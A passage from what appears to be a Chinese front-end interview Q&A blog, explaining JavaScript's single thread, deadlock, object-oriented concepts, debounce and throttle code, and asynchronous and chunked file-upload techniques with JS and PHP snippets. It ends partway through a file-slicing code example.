<p>这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变</p>
<p><strong>扩展：</strong></p>
<p>什么是进程？</p>
<p>进程：是cpu分配资源的最小单位；（是能拥有资源和独立运行的最小单位）</p>
<p>什么是线程？</p>
<p>线程：是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）</p>
<p>浏览器是多进程的？</p>
<p>放在浏览器中，每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。</p>
<p>为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。</p>
<h3 id="41、死锁"><a href="#41、死锁" class="headerlink" title="41、死锁"></a>41、死锁</h3><p><strong>参考答案：</strong></p>
<p>死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行</p>
<p>产生原因</p>
<ul>
<li>竞争资源引起进程死锁</li>
<li>可剥夺和非剥夺资源</li>
<li>竞争非剥夺资源</li>
<li>竞争临时性资源</li>
<li>进程推进顺序不当</li>
</ul>
<p>产生条件</p>
<ol>
<li>互斥条件：涉及的资源是非共享的<ul>
<li>涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放</li>
</ul>
</li>
<li>不剥夺条件：不能强行剥夺进程拥有的资源<ul>
<li>进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放</li>
</ul>
</li>
<li>请求和保持条件：进程在等待一新资源时继续占有已分配的资源<ul>
<li>指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放</li>
</ul>
</li>
<li>环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链</li>
</ol>
<p>解决办法</p>
<p>只要打破四个必要条件之一就能有效预防死锁的发生</p>
<h3 id="42、面向对象的三个特征，分别说一下什么意思"><a href="#42、面向对象的三个特征，分别说一下什么意思" class="headerlink" title="42、面向对象的三个特征，分别说一下什么意思"></a>42、面向对象的三个特征，分别说一下什么意思</h3><p><strong>参考答案：</strong></p>
<p>概念：</p>
<p><strong>封装：</strong>将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。对象接口包括了公共的方法和初始化数据。</p>
<p><strong>继承：</strong> 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。</p>
<p><strong>多态：</strong> 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：多态是指通过指向父类的引用，来调用在不同子类中实现的方法。</p>
<p>特点：</p>
<p><strong>封装</strong>可以隐藏实现细节，使得代码模块化；</p>
<p><strong>继承</strong>可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。</p>
<p><strong>多态</strong>就是相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态</p>
<h3 id="43、防抖和节流的原理和使用场景"><a href="#43、防抖和节流的原理和使用场景" class="headerlink" title="43、防抖和节流的原理和使用场景"></a>43、防抖和节流的原理和使用场景</h3><p><strong>参考答案：</strong></p>
<p>函数防抖和函数节流：优化高频率执行js代码的一种手段，js中的一些事件如浏览器的resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。</p>
<p><strong>防抖：</strong></p>
<p>在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。</p>
<p>根据函数防抖思路设计出第一版的最简单的防抖代码：</p>
<pre class="line-numbers language-none"><code class="language-none">var timer; &#x2F;&#x2F; 维护同一个timer
function debounce(fn, delay) &#123;
    clearTimeout(timer);
    timer &#x3D; setTimeout(function()&#123;
        fn();
    &#125;, delay);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是函数防抖。</p>
<p>在上面的代码中，会出现一个问题，var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题，我们应该用闭包来解决这些问题。</p>
<p>优化后的代码：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> timer<span class="token punctuation">;</span> <span class="token comment">// 维护一个 timer</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> _this <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span> <span class="token comment">// 取debounce执行作用域的this</span>
        <span class="token keyword">var</span> args <span class="token operator">=</span> arguments<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>timer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>_this<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 用apply指向调用debounce的对象，相当于_this.fn(args);</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。</p>
<p><strong>节流：</strong></p>
<p>每隔一段时间，只执行一次函数。</p>
<ul>
<li><p>定时器实现节流函数：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> timer<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> _this <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> args <span class="token operator">=</span> arguments<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>timer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>_this<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
            timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment">// 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>时间戳实现节流函数：</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token parameter">fn<span class="token punctuation">,</span> delay</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> previous <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment">// 使用闭包返回一个函数并且用到闭包函数外面的变量previous</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> _this <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> args <span class="token operator">=</span> arguments<span class="token punctuation">;</span>
        <span class="token keyword">var</span> now <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>now <span class="token operator">-</span> previous <span class="token operator">></span> delay<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>_this<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
            previous <span class="token operator">=</span> now<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<p><strong>异同比较</strong></p>
<p>相同点：</p>
<ul>
<li>都可以通过使用 setTimeout 实现。</li>
<li>目的都是，降低回调执行频率。节省计算资源。</li>
</ul>
<p>不同点：</p>
<ul>
<li>函数防抖，在一段连续操作结束后，处理回调，<strong>利用clearTimeout 和 setTimeout实现</strong>。函数节流，在一段连续操作中，<strong>每一段时间只执行一次</strong>，频率较高的事件中使用来提高性能。</li>
<li>函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。</li>
</ul>
<p>常见应用场景</p>
<p><strong>函数防抖的应用场景:</strong></p>
<p>连续的事件，只需触发一次回调的场景有：</p>
<ul>
<li>搜索框搜索输入。只需用户最后一次输入完，再发送请求</li>
<li>手机号、邮箱验证输入检测</li>
<li>窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。</li>
</ul>
<p>函数节流的应用场景:</p>
<p>间隔一段时间执行一次回调的场景有：</p>
<ul>
<li>滚动加载，加载更多或滚到底部监听</li>
<li>谷歌搜索框，搜索联想功能</li>
<li>高频点击提交，表单重复提交</li>
</ul>
<h3 id="44、文件异步上传怎么实现"><a href="#44、文件异步上传怎么实现" class="headerlink" title="44、文件异步上传怎么实现"></a>44、文件异步上传怎么实现</h3><p><strong>参考答案：</strong></p>
<h4 id="1-普通表单上传"><a href="#1-普通表单上传" class="headerlink" title="1.普通表单上传"></a>1.普通表单上传</h4><p>使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为<code>enctype=&quot;multipart/form-data&quot;</code>，表明表单需要上传二进制数据。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myfile<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后编写<code>index.php</code>上传文件接收代码，使用<code>move_uploaded_file</code>方法即可(php大法好…)</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">$imgName <span class="token operator">=</span> <span class="token string">'IMG'</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'image/'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>$_FILES<span class="token punctuation">[</span><span class="token string">"myfile"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
$fileName <span class="token operator">=</span>  <span class="token string">'upload/'</span><span class="token punctuation">.</span>$imgName<span class="token punctuation">;</span>
<span class="token comment">// 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'myfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $fileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    echo $fileName<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    echo <span class="token string">"nonn"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>form表单上传大文件时，很容易遇见服务器超时的问题。通过xhr，前端也可以进行异步上传文件的操作，一般由两个思路。</p>
<h4 id="2-文件编码上传"><a href="#2-文件编码上传" class="headerlink" title="2.文件编码上传"></a>2.文件编码上传</h4><p>第一个思路是将文件进行编码，然后在服务端进行解码，之前写过一篇在前端实现图片压缩上传的博客，其主要实现原理就是将图片转换成base64进行传递</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> imgURL <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
ctx<span class="token punctuation">.</span><span class="token function">drawImage</span><span class="token punctuation">(</span>imgURL<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 获取图片的编码，然后将图片当做是一个很长的字符串进行传递</span>
<span class="token keyword">var</span> data <span class="token operator">=</span> canvas<span class="token punctuation">.</span><span class="token function">toDataURL</span><span class="token punctuation">(</span><span class="token string">"image/jpeg"</span><span class="token punctuation">,</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js">$imgData <span class="token operator">=</span> $_REQUEST<span class="token punctuation">[</span><span class="token string">'imgData'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$base64 <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> $imgData<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
$img <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span>$base64<span class="token punctuation">)</span><span class="token punctuation">;</span>
$url <span class="token operator">=</span> <span class="token string">'./test.jpg'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span>$url<span class="token punctuation">,</span> $img<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token function">array</span><span class="token punctuation">(</span>
        <span class="token parameter">url</span> <span class="token operator">=></span> $url
    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>base64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加。</p>
<p>更多关于base64的知识，可以参考Base64笔记。</p>
<p>除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 读取二进制文件</span>
<span class="token keyword">function</span> <span class="token function">readBinary</span><span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
   <span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span>text<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">var</span> ui8a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> text<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
     ui8a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>text<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ui8a<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
reader<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">readBinary</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>result<span class="token punctuation">)</span> <span class="token comment">// 读取result或直接上传</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 把从input里读取的文件内容，放到fileReader的result字段里</span>
reader<span class="token punctuation">.</span><span class="token function">readAsBinaryString</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="3-formData异步上传"><a href="#3-formData异步上传" class="headerlink" title="3.formData异步上传"></a>3.formData异步上传</h4><p>FormData对象主要用来组装一组用 XMLHttpRequest发送请求的键&#x2F;值对，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> files <span class="token operator">=</span> e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>files <span class="token comment">// 获取input的file对象</span>
<span class="token keyword">let</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>
axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> formData<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>服务端处理方式与直接form表单请求基本相同。</p>
<h4 id="4-iframe无刷新页面"><a href="#4-iframe无刷新页面" class="headerlink" title="4.iframe无刷新页面"></a>4.iframe无刷新页面</h4><p>在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/form">target</a>属性导致的，其取值有</p>
<ul>
<li><p>_self，默认值，在相同的窗口中打开响应页面</p>
</li>
<li><p>_blank，在新窗口打开</p>
</li>
<li><h4 id="parent，在父窗口打开"><a href="#parent，在父窗口打开" class="headerlink" title="_parent，在父窗口打开"></a>_parent，在父窗口打开</h4></li>
<li><p>_top，在最顶层的窗口打开</p>
</li>
<li><p><code>framename</code>，在指定名字的iframe中打开</p>
</li>
</ul>
<p>如果需要让用户体验异步上传文件的感觉，可以通过<code>framename</code>指定iframe来实现。把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> now <span class="token operator">=</span> <span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">var</span> id <span class="token operator">=</span> <span class="token string">'frame'</span> <span class="token operator">+</span> now
    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;iframe style="display:none;" name="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" id="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">" /></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">var</span> $form <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#myForm"</span><span class="token punctuation">)</span>
    $form<span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
        <span class="token string-property property">"action"</span><span class="token operator">:</span> <span class="token string">'/index.php'</span><span class="token punctuation">,</span>
        <span class="token string-property property">"method"</span><span class="token operator">:</span> <span class="token string">"post"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"enctype"</span><span class="token operator">:</span> <span class="token string">"multipart/form-data"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"encoding"</span><span class="token operator">:</span> <span class="token string">"multipart/form-data"</span><span class="token punctuation">,</span>
        <span class="token string-property property">"target"</span><span class="token operator">:</span> id
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#"</span><span class="token operator">+</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">"load"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> content <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>扩展：</strong></p>
<p><strong>大文件上传</strong></p>
<p>现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题，</p>
<ul>
<li>表单上传和iframe无刷新页面上传，实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形</li>
<li>通过fromData，其实际也是在xhr中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题</li>
<li>编码上传，我们可以比较灵活地控制上传的内容</li>
</ul>
<p>大文件上传最主要的问题就在于：<strong>在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传</strong>。试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？</p>
<p>综合上面的问题，看来大文件上传需要实现下面几个需求</p>
<ul>
<li>支持拆分上传请求(即切片)</li>
<li>支持断点续传</li>
<li>支持显示上传进度和暂停上传</li>
</ul>
<p>接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。</p>
<p><strong>文件切片</strong></p>
<p>编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。</p>
<p>在JavaScript中，文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice，通过这个方法，我们就可以对二进制文件进行拆分。</p>
<p>下面是一个拆分文件的示例</p>
<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">slice</span><span class="token punctuation">(</span><span class="token parameter">file<span class="token punctuation">,</span> piece <span class="token operator">=</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">5</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 <span class="token keyword">let</span> totalSize <span class="token operator">=</span> file<span class="token punctuation">.</span>size<span class="token punctuation">;</span> <span class="token comment">// 文件总大小</span>
 <span class="token keyword">let</span> start <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 每次上传的开始字节</span>
